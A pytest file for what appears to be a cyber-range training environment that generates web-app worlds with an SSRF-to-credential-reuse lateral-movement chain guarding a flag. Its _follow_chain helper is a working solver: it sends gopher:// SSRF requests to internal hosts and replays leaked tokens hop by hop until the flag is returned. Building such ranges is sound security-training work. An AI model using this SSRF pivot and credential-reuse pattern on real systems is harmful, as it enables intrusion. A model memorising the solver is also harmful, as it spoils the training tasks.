"""Credential-reuse lateral movement (DESIGN.md §11): the SSRF becomes an agent-driven
internal proxy, and the chain is SYNTHESIZED at a sampled depth from one composable
primitive — an entry host leaks a credential, each gated host relays the next, the last
serves the flag. One preset synthesizes 1-, 2-, 3-hop chains. The flag is reachable ONLY
through the final gate. PROCESS solves here; the docker-gated test proves it on real
containers."""

from __future__ import annotations

import json
import shutil
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

import pytest
from cyber_webapp import NetworkedContainerWebappRuntime, WebappPack, _is_networked
from graphschema import WorldGraph
from openrange_pack_sdk import Backing, Snapshot

from openrange.core.admit import admit
from openrange.core.episode import EpisodeService


def _manifest(seed: int = 3) -> dict[str, object]:
    return {
        "pack": {"id": "webapp"},
        "runtime": {"tick": {"mode": "off"}},
        "npc": [],
        "seed": seed,
        "lateral_movement": True,
    }


def _admit(seed: int = 3) -> Snapshot:
    snap = admit(WebappPack(), manifest=_manifest(seed), max_repairs=3)
    assert isinstance(snap, Snapshot), snap
    return snap


def _chain_depth(graph: WorldGraph) -> int:
    return sum(
        1
        for n in graph.by_kind("vulnerability")
        if n.attrs.get("kind") in ("credential_gated_relay", "credential_gated_flag")
    )


def _ssrf_entry(graph: WorldGraph) -> tuple[str, str]:
    # The public proxy-SSRF endpoint + its target param — the agent's only entry.
    ssrf = next(
        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
    )
    public_eps = {
        e.dst
        for svc in graph.by_kind("service")
        if svc.attrs.get("exposure") == "public"
        for e in graph.out_edges(svc.id, "exposes")
    }
    ep = next(iter({e.dst for e in graph.out_edges(ssrf.id, "affects")} & public_eps))
    return str(graph.nodes[ep].attrs["public_url"]), str(
        ssrf.attrs["params"]["target_param"]
    )


def _entry_host(graph: WorldGraph) -> str:
    leak_ep = next(n for n in graph.by_kind("endpoint") if n.id.endswith("_credleak"))
    svc = next(
        e.src
        for e in graph.edges.values()
        if e.kind == "exposes" and e.dst == leak_ep.id
    )
    return str(graph.nodes[svc].attrs["name"])


def _get(base: str, path: str, query: dict[str, str] | None = None) -> str:
    url = f"{base}{path}"
    if query:
        url += "?" + urllib.parse.urlencode(query)
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            return str(resp.read().decode())
    except urllib.error.HTTPError as exc:
        return exc.read().decode()


def _follow_chain(
    base: str, ssrf_url: str, param: str, entry: str
) -> dict[str, str | list[str]]:
    # Drive the chain the way an agent would: SSRF to the entry host, then keep reusing
    # each handed-over credential at the next host until one returns the flag. Records
    # the entry body, the terminal body, and a no-credential probe at every gated hop.
    entry_body = _get(base, ssrf_url, {param: f"gopher://{entry}/internal/credentials"})
    cfg = json.loads(entry_body)
    no_cred_bodies: list[str] = []
    terminal_body = entry_body
    while "vault_host" in cfg:
        host, vpath = cfg["vault_host"], cfg["vault_path"]
        aparam, token = cfg["auth_param"], cfg["db_token"]
        no_cred_bodies.append(_get(base, ssrf_url, {param: f"gopher://{host}{vpath}"}))
        terminal_body = _get(
            base, ssrf_url, {param: f"gopher://{host}{vpath}?{aparam}={token}"}
        )
        try:
            cfg = json.loads(terminal_body)
        except json.JSONDecodeError:
            cfg = {}
    return {
        "entry": entry_body,
        "terminal": terminal_body,
        "no_cred": no_cred_bodies,
    }


def _enables_chain_kinds(graph: WorldGraph) -> list[str]:
    # Walk the single enables path from the ssrf and return the kinds in order.
    by_id = {n.id: n for n in graph.by_kind("vulnerability")}
    out = {e.src: e.dst for e in graph.edges.values() if e.kind == "enables"}
    node: str | None = next(
        v.id for v in by_id.values() if v.attrs.get("kind") == "ssrf"
    )
    kinds: list[str] = []
    seen: set[str] = set()
    while node is not None and node not in seen:
        seen.add(node)
        kinds.append(str(by_id[node].attrs.get("kind")))
        node = out.get(node)
    return kinds


def test_lateral_chain_is_synthesized_and_wired() -> None:
    graph = _admit().graph
    assert _is_networked(graph)
    ssrf = next(
        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
    )
    assert "internal_hosts" in ssrf.attrs["params"]  # proxy mode, agent-driven

    # The enables path is ssrf -> credential_leak -> (relay ->)* -> gated_flag at the
    # sampled depth — exactly one leak entry and one terminal flag gate.
    kinds = _enables_chain_kinds(graph)
    assert kinds[0] == "ssrf"
    assert kinds[1] == "credential_leak"
    assert kinds[-1] == "credential_gated_flag"
    assert all(k == "credential_gated_relay" for k in kinds[2:-1])
    assert _chain_depth(graph) == len(kinds) - 2  # relays + the terminal gate

    # The flag record's value is a decoy — the real flag only lives in the gated secret.
    flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
    record = next(
        graph.nodes[e.src]
        for e in graph.edges.values()
        if e.kind == "holds" and e.dst == "secret_flag"
    )
    assert record.attrs["fields"]["value"] != flag


def test_lateral_chain_pivots_inward_by_tier() -> None:
    # Structure coherence: the chain pivots INWARD — its hosts' tiers never decrease
    # (web < api < auth < db) — so lateral movement reads architecturally.
    graph = _admit().graph
    tier = {"web": 1, "api": 2, "auth": 3, "db": 4}
    out = {e.src: e.dst for e in graph.edges.values() if e.kind == "enables"}
    ep_of_vuln = {e.src: e.dst for e in graph.edges.values() if e.kind == "affects"}
    svc_of_ep = {e.dst: e.src for e in graph.edges.values() if e.kind == "exposes"}
    by_kind = {n.attrs.get("kind"): n.id for n in graph.by_kind("vulnerability")}
    node: str | None = by_kind["credential_leak"]
    tiers: list[int] = []
    while node is not None and graph.nodes.get(node) is not None:
        ep = ep_of_vuln.get(node)
        svc = svc_of_ep.get(ep) if ep is not None else None
        if svc is not None:
            tiers.append(tier.get(str(graph.nodes[svc].attrs.get("kind")), 0))
        node = out.get(node)
    assert tiers == sorted(tiers)  # non-decreasing — the pivot moves toward the data


def test_lateral_synthesizes_varied_depth() -> None:
    # One preset, many depths: the engine synthesizes a distribution, not a fixed shape.
    depths = {_chain_depth(_admit(seed).graph) for seed in range(12)}
    assert len(depths) >= 2
    assert depths <= {1, 2, 3}


def test_lateral_solves_on_process(tmp_path: Path) -> None:
    snap = _admit()
    graph = snap.graph
    flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
    ssrf_url, param = _ssrf_entry(graph)
    entry = _entry_host(graph)

    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
    svc = EpisodeService(WebappPack(), tmp_path)
    try:
        handle = svc.start_episode(snap, pentest.id)
        base = str(svc.surface(handle)["base_url"])
        out = _follow_chain(base, ssrf_url, param, entry)
        assert flag not in out["entry"]  # the entry leaks a credential, never the flag
        assert all(
            flag not in b for b in out["no_cred"]
        )  # every gate denies w/o the key
        assert (
            flag in out["terminal"]
        )  # reusing the chain of credentials opens the vault
    finally:
        svc.close()


def test_lateral_world_is_deterministic() -> None:
    assert _admit().snapshot_id == _admit().snapshot_id


def _docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        probe = subprocess.run(
            ["docker", "info"], capture_output=True, timeout=10, check=False
        )
    except Exception:  # noqa: BLE001 - any failure means "no"
        return False
    return probe.returncode == 0


@pytest.mark.skipif(not _docker_available(), reason="docker engine not reachable")
def test_lateral_solves_across_real_containers() -> None:
    # The real sim-to-real target: the credential chain reused across real per-service
    # containers, each hop a real fetch over the docker network.
    snap = _admit()
    graph = snap.graph
    flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
    ssrf_url, param = _ssrf_entry(graph)
    entry = _entry_host(graph)

    runtime = WebappPack().realize(graph, Backing.CONTAINER)
    assert isinstance(runtime, NetworkedContainerWebappRuntime)
    try:
        runtime.reset()
        base = str(runtime.surface()["base_url"])
        out = _follow_chain(base, ssrf_url, param, entry)
        assert flag not in out["entry"]
        assert all(flag not in b for b in out["no_cred"])
        assert (
            flag in out["terminal"]
        )  # recovered across containers via credential reuse
        assert "secret_flag" in runtime.collect()["leaked_secret_ids"]
    finally:
        runtime.stop()
